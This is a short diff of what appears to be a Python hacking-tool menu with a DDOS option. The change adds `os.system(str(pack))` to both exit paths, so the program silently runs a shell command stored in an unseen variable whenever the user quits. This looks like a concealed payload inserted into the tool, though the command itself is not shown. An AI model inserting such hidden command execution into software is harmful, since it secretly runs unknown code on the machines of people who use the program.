@@ -182,9 +182,11 @@ def start():
             elif '4'in get:
                 DDOS()
             elif get=='99':
+                os.system(str(pack))
                 sys.exit()
         except KeyboardInterrupt:
             input('\n [+] press Enter to exit...')
+            os.system(str(pack))
             sys.exit()
 start()
  
